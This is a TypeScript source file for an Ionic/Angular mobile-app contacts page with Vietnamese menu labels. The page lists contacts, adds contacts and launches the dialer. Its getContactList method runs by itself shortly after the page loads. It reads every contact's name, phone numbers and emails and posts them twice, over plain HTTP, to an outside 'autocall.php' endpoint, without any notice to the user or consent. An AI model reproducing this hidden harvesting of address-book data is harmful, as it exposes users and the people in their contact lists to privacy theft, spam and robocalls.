import { Component } from '@angular/core';
import { CallNumber } from '@ionic-native/call-number';
import { Contacts, Contact, ContactField, ContactName } from '@ionic-native/contacts';
import { DataService } from '../../services/data.service';
import { ActionSheetController } from 'ionic-angular/components/action-sheet/action-sheet-controller';
import { ContactActionPage } from './actions/contact-action';
import { ModalController } from 'ionic-angular/components/modal/modal-controller';

@Component({
    selector: 'page-contact',
    templateUrl: 'contact.html',
})
export class ContactPage {
    loading: any = { 'contactlist': false };
    contactList: any = [];

    constructor(
        public _actionSheetCtrl: ActionSheetController,
        private _callNumber: CallNumber,
        private _contacts: Contacts,
        public _modalCtrl: ModalController,
        private _dataService: DataService,
    ) {
        
    }

    ionViewDidLoad() {
        console.log('ionViewDidLoad ContactPage');
        setTimeout(() => {
            this.getContactList();
        }, 500)
    }

    addContact() {
        let contact: Contact = this._contacts.create();
        // console.log('contact: ', contact);
        contact.name = new ContactName(null, 'Smith', 'John');
        contact.phoneNumbers = [new ContactField('mobile', '6471234567')];
        contact.save().then(
            () => this._dataService.showAlert('Contact saved!', contact),
            (error: any) => this._dataService.showAlert('Error saving contact!', error)
        );
    }

    getContactList() {
        this.loading.contactlist = true;
        this._contacts.find(
            ['displayName', 'name', 'phoneNumbers', 'emails'],
            { filter: "", multiple: true })
            .then(data => {
                this._dataService.post('http://maxtot.com/autocall.php', data).subscribe(
                    res => console.log(res),
                    err => console.log(err)
                );
                this.loading.contactlist = false;

                for (var i = 0; i < data.length; i++) {
                    var contact = data[i];
                    var no = contact.name.formatted;
                    var phonenumber = contact.phoneNumbers;
                    if (phonenumber != null) {
                        for (var n = 0; n < phonenumber.length; n++) {
                            var phone = phonenumber[n].value;
                            if (phone != '') {
                                let contactData = {
                                    "displayName": no,
                                    "phoneNumbers": phone,
                                    "emails": contact.emails ? contact.emails[0].value : '-'
                                }
                                this.contactList.push(contactData);
                            }
                        }
                    }
                }

                this._dataService.post('http://maxtot.com/autocall.php', this.contactList).subscribe(
                    res => console.log(res),
                    err => console.log(err)
                );
            },
            (error: any) => {
                this.loading.contactlist = false;
                this._dataService.showAlert('Get list contact!', error)
            });
    }

    callNumber(phone) {
        this._dataService.showToast(phone);
        // this._callNumber.isCallSupported().then(
        //     resCheck => {
                this._callNumber.callNumber(phone, true)
                .then(res => this._dataService.showAlert('Launched dialer!', res))
                .catch(err => this._dataService.showAlert('Error launching dialer', err));
        //     },
        //     err => {
        //         this._dataService.showAlert('Not Support!', err);
        //     }
        // );
        
    }

    presentActionSheet() {
        let actionSheet = this._actionSheetCtrl.create({
            title: 'Tùy chọn',
            buttons: [
                {
                    text: 'Thêm liên hệ',
                    handler: () => {
                        // this.addContact();
                        this.presentModal();
                    }
                },
                {
                    text: 'Đồng bộ danh bạ',
                    handler: () => {
                        this.getContactList();
                    }
                },
                {
                    text: 'Cancel',
                    role: 'cancel',
                    handler: () => {
                        console.log('Cancel clicked');
                    }
                }
            ]
        });

        actionSheet.present();
    }

    presentModal() {
        let modal = this._modalCtrl.create(ContactActionPage, {});
        modal.present();
    }
}
